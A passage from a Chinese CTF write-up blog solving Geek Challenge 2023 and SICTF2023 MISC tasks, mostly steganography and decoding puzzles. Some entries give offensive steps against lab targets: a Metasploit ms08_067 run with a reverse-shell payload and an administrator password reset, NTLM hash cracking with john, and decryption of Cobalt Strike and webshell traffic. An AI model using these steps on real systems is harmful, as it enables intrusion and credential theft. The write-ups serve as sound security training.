class="built_in">hex</span>(mi^^key)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;really_algebreally_algebreally_a&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;ra_master&#125;\x02\x02ra_master&#125;\x02\x02ra_maste&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;You_are_really_algebra_master&#125;</code>。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="cheekin"><a href="#cheekin" class="headerlink" title="cheekin"></a>cheekin</h3><blockquote><p>请前往”三叶草小组Syclover”微信公众号输入flag获得flag</p></blockquote><p>发送flag，下载图片，zsteg的b1,rgb,lsb,xy通道有 <code>syc&#123;s4y_he110_t0_syclover&#125;</code>。</p><p>​    </p><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><blockquote><p>游戏通关即可得到flag内容，需要自行添加<code>SYC&#123;&#125;</code>包含。例: flag内容为 haha_haha 则最终flag为 SYC{haha_haha} 题目链接：<a href="https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek">https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek</a> hint: data.win</p></blockquote><p>使用<a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a>工具解包data.win，在string窗口找到：<code>c20xbGVfMXNfQF9uMWNlX2dAbWU=</code>，base64解码：<code>sm1le_1s_@_n1ce_g@me</code>。</p><p>flag：<code>SYC&#123;sm1le_1s_@_n1ce_g@me&#125;</code></p><p>​    </p><h3 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h3><blockquote><p>“o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索…”。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。 hint1: Stegsolve lsb hint2: 图片大小和像素点</p></blockquote><p>png图片末尾提取出：</p><p><code>IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI=</code></p><p>base64解码：</p><p><code>&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</code></p><p>没什么用，zsteg 在 b1,rgb,lsb,xy 通道提取出：</p><p><code>IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</code></p><p>base64解码：</p><p><code>&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</code></p><p>得到flag前半段：<code>SYC&#123;D4@Th_N0t4_</code>。</p><p>放大图片，可发现白色像素点，结合题目查找为<a href="https://www.fonts.net.cn/font-17419261686.html">死亡笔记字体</a>，字符串：<code>TkFNRV9vMnRha3VYWH0</code></p><p>base64解码得到flag后半段：<code>NAME_o2takuXX&#125;</code>。</p><p>flag：<code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></p><p>​    </p><h3 id="下一站是哪儿呢"><a href="#下一站是哪儿呢" class="headerlink" title="下一站是哪儿呢"></a>下一站是哪儿呢</h3><blockquote><p>我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？  flag格式：SYC{航班号_城市拼音}，城市拼音首字母大写噢</p></blockquote><p>查询 <code>有白色钢琴的机场</code>，配合百度以图搜图功能，查找到地点为：<code>深圳宝安国际机场</code>。</p><p>从1.jpg提取出zip压缩包，得到secret.png，为Standard Galactic Alphabet字体，利用<a href="https://www.dcode.fr/standard-galactic-alphabet">在线网站</a>解出信息为：<code>I WANT TO GO TO LIQUOR CITY</code>。</p><p>LIQUOR CITY=酒城=泸州市，城市拼音：<code>Luzhou</code>。</p><p>根据图片信息：时间8.25 20:19 马上起飞，在<a href="https://www.flightstats.com/v2/flight-tracker/route/SZX/LZO/?year=2023&amp;month=10&amp;date=24&amp;hour=18">flightstats</a>上查询深圳-泸州的航班号为：<code>CZ8579</code>。</p><p>flag：<code>SYC&#123;CZ8579_Luzhou&#125;</code></p><p>​    </p><h3 id="Qingwan心都要碎了"><a href="#Qingwan心都要碎了" class="headerlink" title="Qingwan心都要碎了"></a>Qingwan心都要碎了</h3><blockquote><p>Qingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？ flag格式：SYC{地点名字}</p></blockquote><p>百度，以图搜图。</p><p><code>SYC&#123;重庆中国三峡博物馆&#125;</code></p><p>​    </p><h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><blockquote><p>Qrcode can deliver binary msg</p></blockquote><p>png分离得到两张png图片，按像素值异或操作即得到新二维码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000000.png&#x27;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000001.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img1.size)</span><br><span class="line"><span class="built_in">print</span>(img2.size)</span><br><span class="line">width , height = img2.size</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width , height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        x1 = <span class="number">1</span> <span class="keyword">if</span> img1.getpixel((<span class="number">3</span>*i,<span class="number">3</span>*j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x2 = <span class="number">1</span> <span class="keyword">if</span> img2.getpixel((i,j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x = x1^x2</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;new.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;hOp3_u_h@ve_Fun&#125;</code></p><p>​    </p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><blockquote><p>“你看见了《DEATH NOTE》上面的名字，这时，Arahat0给你传了两个文件，并留言:” “[他拥有死神之眼，请小心，他在找你，还剩1920秒…]” “&lt;当前时间 10:52&gt;”。flag有两段</p></blockquote><p>webp文件在线转gif，使用gifsplitter拆分为880张图片。</p><p>猜测宽高为 <code>40*22</code>，合并：<code>montage *.bmp -tile 40x22 -geometry +0+0 ../out.png</code></p><p>拼图：<code>gaps --image=out.png --size=48 --save</code></p><p>得到文字：<code>XzE0X0tpMTE0Un0==</code>，base64解码得flag后半段：<code>_14_Ki114R&#125;</code>。</p><p>mp3文件提取SSTV信息：<code>sstv -d L1.wav -o 1.png</code></p><p>得到的图片里的文字为flag前半段：<code>SYC&#123;H4xr0t0r</code>。</p><p>flag：<code>SYC&#123;H4xr0t0r_14_Ki114R&#125;</code></p><p>​    </p><h3 id="窃听风云"><a href="#窃听风云" class="headerlink" title="窃听风云"></a>窃听风云</h3><blockquote><p>Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC{password}</p></blockquote><p>NTLMSSP流量，利用提取工具 <a href="https://github.com/sinnaj-r/NTLMssp-Extract/blob/master/ntlmssp_extract.py">ntlmssp_extract</a> 提取NTLM得：</p><p><code>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></p><p>保存为hash文件，再用john解：</p><p><code>john hash --wordlist=rockyou.txt</code></p><p>结果：<code>iamjackspassword (jack)</code></p><p>flag：<code>SYC&#123;iamjackspassword&#125;</code></p><p>​    </p><h3 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h3><blockquote><p>Try to extract me!</p></blockquote><p>4字节CRC32爆破，利用<a href="https://github.com/theonlypwner/crc32">CRC32 Tools</a>分别爆破8段字符串：</p><p><code>python crc32.py reverse 0xXXXXXXXX</code></p><p>拼接得flag：<code>SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></p><p>​    </p><h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><blockquote><p>2001年的大屁股电脑，到了2023年会被揍得多惨呢？ 链接: <a href="https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek">https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek</a> 提取码: geek</p></blockquote><p>WinXP虚拟机，用VMWare加载但无登录密码。</p><p>参考：<a href="https://blog.csdn.net/fengzilin1973/article/details/115967231">使用MSF 利用 ms08_067 对 XP 进行渗透</a></p><p>先对网段扫描IP：<code>nmap -sC -sV 192.168.79.0/24</code></p><p>得到IP后，使用MSF攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms08_067</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloads</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132</span><br><span class="line">RHOST =&gt; 192.168.79.132</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 </span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128</span><br><span class="line">LHOST =&gt; 192.168.79.128</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; run</span><br></pre></td></tr></table></figure><p>getshell之后，使用net命令修改administrator密码：</p><p><code>net user administrator 123456</code></p><p>进入系统，桌面背景图得flag：<code>SYC&#123;You_defeated_me_after_22_years&#125;</code>。</p><p>​    </p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><blockquote><p>Just so so 属于blockchain 题目链接：<a href="http://47.109.106.62:1234/">http://47.109.106.62:1234/</a></p></blockquote><p>用Remix编译后，执行 <code>airdrop()</code> 函数，即满足 <code>isSolved()</code> 条件，</p><p>得到flag：<code>SYC&#123;kajd_u_iaak___hdskj_a&#125;</code>。</p><p>​    </p><h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><blockquote><p>Great  属于blockchain 题目链接：<a href="http://47.109.106.62:1235/">http://47.109.106.62:1235/</a></p></blockquote><p>转账即可。</p><p>​    </p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH_N2TE"></a>DEATH_N2TE</h3><blockquote><p>“你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:” “[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名…]”。</p></blockquote><p>mp4分帧：<code>ffmpeg -i kira.mp4 %05d.png</code></p><p>提取每一帧的列，组合：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">width,height = <span class="number">192</span>,<span class="number">108</span></span><br><span class="line">img_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&#x27;x/<span class="subst">&#123;<span class="built_in">str</span>(i+<span class="number">1</span>).zfill(<span class="number">5</span>)&#125;</span>.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            tmp = img.getpixel((i*<span class="number">10</span>+start,j*<span class="number">10</span>+start))</span><br><span class="line">            img_new.putpixel((i,j),tmp)</span><br><span class="line"></span><br><span class="line">    img_new.save(<span class="string">f&#x27;x/out_with_start_<span class="subst">&#123;start&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>start=5的时候，得flag：<code>SYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;</code>。</p><p>​    </p><h3 id="窃听风云-V2"><a href="#窃听风云-V2" class="headerlink" title="窃听风云-V2"></a>窃听风云-V2</h3><blockquote><p>这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC{password}</p></blockquote><p>SMTP流量，wireshark 解析ntlmssp，按照</p><p><a href="https://www.youtube.com/watch?v=mu7-naA0muc">Extracting NTLM Hash Values from a Wireshark packet capture</a></p><p>构造出ntlmssp：</p><p><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></p><p>再用john爆破即可：<code>john token.txt --wordlist=rockyou.txt</code></p><p>得到 <code>jack100589barney (jack)</code>，flag：<code>SYC&#123;jack100589barney&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;第十四届极客大挑战 GEEK CHALLENGE 2023‼️&lt;br&gt;开放注册：10月25日晚10点&lt;br&gt;比赛时间：10月26日晚8点-11月26日晚8点&lt;br&gt;平台链接：&lt;a href=&quot;https://game.sycsec.com/&quot;&gt;ht</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>SICTF2023 Round2</title>
    <link href="https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/"/>
    <id>https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/</id>
    <published>2023-09-10T05:39:56.000Z</published>
    <updated>2023-09-10T07:43:36.091Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>SICTF2023 #Round2 是杭州电子科技大学信息工程学院和广东海洋大学联合举办的网络安全赛。</p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="[签到]Welcome"></a>[签到]Welcome</h3><p><code>SICTF&#123;Welcome_to_SICTF2023_#Round2&#125;</code></p><p>​    </p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>LSB隐写：<code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Pixel_art.png &gt; 1.png</code></p><p>提取RGB值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">f = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">tmp = img.getpixel((j,i))</span><br><span class="line">f+=<span class="built_in">bytes</span>(<span class="built_in">list</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>在线ook解码，得flag：<code>SICTF&#123;0141ac35-ec19-4cee-a906-22805fdbed77&#125;</code>。</p><p>​    </p><h3 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h3><p>Cobalt Strike流量分析，参考：<a href="https://blog.scrt.ch/2023/04/01/hex-filtrate/">https://blog.scrt.ch/2023/04/01/hex-filtrate/</a></p><p>提取出最后一个流里的key，解析cookie：</p><p><code>python3 cs-decrypt-metadata.py U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s= -f key</code></p><p>拿到Raw key后，再分析流量文件：</p><p><code>python3 cs-parse-traffic.py -r 1ddb06c55884caf491bdb370ca48389c 11.pcapng</code></p><p>得到flag：<code>SICTF&#123;88a39373-e204-43b6-b321-33ac8972fde9&#125;</code></p><p>​    </p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>部分明文攻击，<code>1.png</code> 为png图片前18字节：</p><p><code>rbkcrack -C flag.zip -c flag.png -p 1.png</code></p><p>得到key后再提取：</p><p><code>rbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</code></p><p>flag：<code>SICTF&#123;3a4998b8-345e-4943-a689-d01e8b08defb&#125;</code></p><p>​    </p><h3 id="还不上号"><a href="#还不上号" class="headerlink" title="还不上号"></a>还不上号</h3><p>flag1.pcapng是冰蝎流量，flag2.pcapng是CS流量。</p><p>先看flag2.pcapng，提取 <code>key.zip</code> 解压，<code>key</code> 中有零宽字符隐写，得到 <code>cd52f1488563bf0e</code>，是冰蝎流量的key。</p><p>flag1.pcapng中，参考Easy_Shark解密代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;cd52f1488563bf0e&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将响应数据包中的base64字符串带入得到各流的解密内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 流2</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">key</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># 流4</span><br><span class="line">SICTF&#123;79e1755e-08a8-4d</span><br><span class="line"></span><br><span class="line"># 流6</span><br><span class="line">rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAv</span><br><span class="line">cnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtM</span><br><span class="line">AAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5</span><br><span class="line">cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hw</span><br><span class="line">c3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZh</span><br><span class="line">L3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGlj</span><br><span class="line">S2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJM</span><br><span class="line">amF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtM</span><br><span class="line">amF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6</span><br><span class="line">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL0M6FR0Cb9dW52Nd5NTA1JUNAs1</span><br><span class="line">thS8iXx6QB+UkN/vRJdfsKS8dnOfNuPuPDCtx26B2j8I1FuTJ1VrrfDkzN585sskmXYronFM98Dx</span><br><span class="line">50vHaadOcDcDdBBqi8gC5/D3iKflX6T9pSL/5PVLfN1EIaFsyAS9jpWX2wGNi3C/QPSrAgMBAAEC</span><br><span class="line">gYAdNhXeGtH4wkWqOhY8aurL+VvTUZjRanJ6C+/FkXCzUWbRVwVV5xMMeZEDNigRw4BZ2HGvJL+f</span><br><span class="line">aMT+o3VMkCYBhGbi2/3RPRgigMG7Aa3LWWtYWsdbw8Mw6aqqbTjDUHrQ1kulMf1JvXJL5LBd+pBA</span><br><span class="line">Q8kHaYJRMcmnLsT4NeXOFQJBAMNa2r+phrThTlagMB6bj6vl0IVbDy+TJT2VybCSJ76rPgVUQwtP</span><br><span 